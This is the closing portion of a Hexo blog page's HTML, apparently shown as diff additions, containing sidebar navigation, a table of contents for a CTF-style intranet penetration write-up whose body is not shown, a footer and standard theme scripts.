class="toc-number">4.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag3"><span class="toc-number">5.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag4"><span class="toc-number">6.</span> <span class="toc-text">flag4</span></a></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatarrr.jpg" data-sizes="auto" alt="阿尼亚はこれが好き" class="lazyload">
+  <div class="sidebar-author-name">阿尼亚はこれが好き</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../index.html" aria-label="Home"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../archives" aria-label="Archives"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../about" aria-label="About"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../friend" aria-label="Friend"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        阿尼亚はこれが好き
+      </div>
+      
+        <div>
+          Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          2.3k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          00:08
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">内网渗透大致流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%A7%8B%E8%BF%9B%E6%94%BB"><span class="toc-number">3.</span> <span class="toc-text">正式开始进攻</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">4.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag3"><span class="toc-number">5.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag4"><span class="toc-number">6.</span> <span class="toc-text">flag4</span></a></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatarrr.jpg" data-sizes="auto" alt="阿尼亚はこれが好き" class="lazyload">
+  <div class="sidebar-author-name">阿尼亚はこれが好き</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../index.html" aria-label="Home"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../archives" aria-label="Archives"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../about" aria-label="About"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="../../../../friend" aria-label="Friend"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+
+
+<script src="../../../../js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.1.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+  <!-- hexo injector body_end start -->
+<script src="js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
